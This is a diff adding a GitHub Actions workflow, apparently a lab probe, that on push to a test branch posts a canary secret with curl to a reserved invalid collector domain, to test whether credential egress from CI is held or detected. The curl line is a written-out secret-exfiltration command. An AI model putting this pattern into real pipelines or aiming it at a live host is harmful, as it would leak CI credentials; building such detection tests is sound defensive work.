@@ -1,0 +1,23 @@
+name: Hold probe 02 - credential egress
+
+on:
+  push:
+    branches:
+      - case-02-credential-egress
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 2
+    steps:
+      - name: Attempt obvious secret transfer to a reserved invalid domain
+        env:
+          LAB_CANARY: ${{ secrets.LAB_CANARY }}
+        run: |
+          curl --fail --max-time 3 \
+            --data-urlencode "token=${LAB_CANARY}" \
+            https://credential-collector.invalid/ingest || true
+          printf '%s\n' 'HOLD_LAB_CASE=credential-egress'
